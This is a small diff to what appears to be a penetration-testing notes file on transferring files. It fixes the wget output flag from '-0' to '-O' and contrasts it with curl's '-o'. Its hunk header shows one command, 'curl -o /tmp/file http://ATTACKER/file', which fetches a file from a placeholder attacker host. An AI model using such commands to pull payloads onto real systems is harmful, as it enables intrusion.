@@ -20,7 +20,7 @@ curl -o /tmp/file http://ATTACKER/file
 
 ## Remember 
 
-- wget is -0
-- curl is -o
+- wget uses capital `-O` (the letter O, not zero)
+- curl uses lowercase `-o`
 - You can also download file directly from github with this method
 
